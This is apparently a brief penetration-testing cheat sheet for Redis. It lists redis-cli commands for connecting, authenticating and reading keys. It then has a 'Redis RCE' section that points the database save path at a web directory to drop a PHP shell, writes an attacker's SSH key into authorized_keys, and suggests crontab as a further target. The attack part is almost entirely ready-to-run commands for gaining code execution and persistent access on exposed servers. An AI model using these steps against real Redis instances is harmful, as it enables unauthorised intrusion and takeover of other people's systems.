# Redis

### Useful Commands

```bash
# connect
redis-cli -h <ip>
# authenticate in case its required
AUTH password (or AUTH username password)
# get dbs
info
# select db
select 0
# get value of key
get <key>
# get value of key in case its a list
lrange <key> 1 10
```

### Redis RCE

```text
redis-cli -h <ip>
config set dir <web dir>
config set dbfilename <shell.php>
set test <php or key>
save
```

In case you want to upload a ssh key to an authorized\_keys file, set the key before saving the db, e.g.:

```text
cat authorized_keys | redis-cli -h <ip> -x set sshkey
```

Other useful locations include for example crontab.

